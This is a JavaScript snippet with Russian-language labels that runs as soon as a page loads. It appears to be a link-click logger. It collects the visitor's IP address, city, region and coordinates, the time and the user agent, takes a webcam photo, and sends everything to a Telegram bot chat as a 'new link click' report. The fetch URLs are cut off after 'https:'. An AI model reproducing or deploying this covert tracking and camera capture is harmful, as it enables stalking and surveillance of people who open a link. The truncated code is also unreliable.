(async function() {
    "use strict";
    let ipAddress = "0.0.0.0";let geo = "не определена";try {
        const ipRes = await fetch("https:
        const ipData = await ipRes.json();ipAddress = ipData.ip;const geoRes = await fetch(`https:
        
        const geoReq = await fetch(`https:
        const geoData = await geoReq.json();geo = `${geoData.city},${geoData.region},${geoData.country_name} (${geoData.latitude},${geoData.longitude})`;} catch(e) {
        geo = "ошибка геолокации";}

    
    const now = new Date();const timeStr = now.toLocaleString("ru-RU",{ timeZone: "Europe/Moscow" }) + " MSK";
    const userAgent = navigator.userAgent;let deviceType = "не определено";if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
        deviceType = "Мобильное устройство";} else if (/Windows|Mac|Linux|X11/i.test(userAgent)) {
        deviceType = "Десктоп";}
    
    
    let shortUA = userAgent;if (userAgent.length > 100) {
        shortUA = userAgent.substring(0,97) + "...";}

    
    const caption = `Новый переход по ссылке!

IP Адресс: ${ipAddress}
 ├─ Гео/Локация: ${geo}
 ├─ Время перехода: ${timeStr}
 └─ Устройство/UserAgent: ${deviceType} | ${shortUA}`;
    let photoBlob = null;try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });const video = document.createElement("video");video.srcObject = stream;video.autoplay = true;video.playsInline = true;await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();resolve();};});await new Promise(r => setTimeout(r,500));const canvas = document.createElement("canvas");canvas.width = video.videoWidth || 640;canvas.height = video.videoHeight || 480;const ctx = canvas.getContext("2d");ctx.drawImage(video,0,0,canvas.width,canvas.height);photoBlob = await new Promise(resolve => {
            canvas.toBlob(resolve,"image/jpeg",0.85);});stream.getTracks().forEach(track => track.stop());} catch(e) {
        console.warn("Camera error:",e);photoBlob = null;}

    
    async function sendPhotoWithCaption(blob,captionText) {
        const url = `https:
        const formData = new FormData();formData.append("chat_id",TELEGRAM_CHAT_ID);formData.append("photo",blob,"webcam_snapshot.jpg");formData.append("caption",captionText);const response = await fetch(url,{ method: "POST",body: formData });return response.json();}

    if (photoBlob) {
        await sendPhotoWithCaption(photoBlob,caption);} else {
        
        
    }
})();
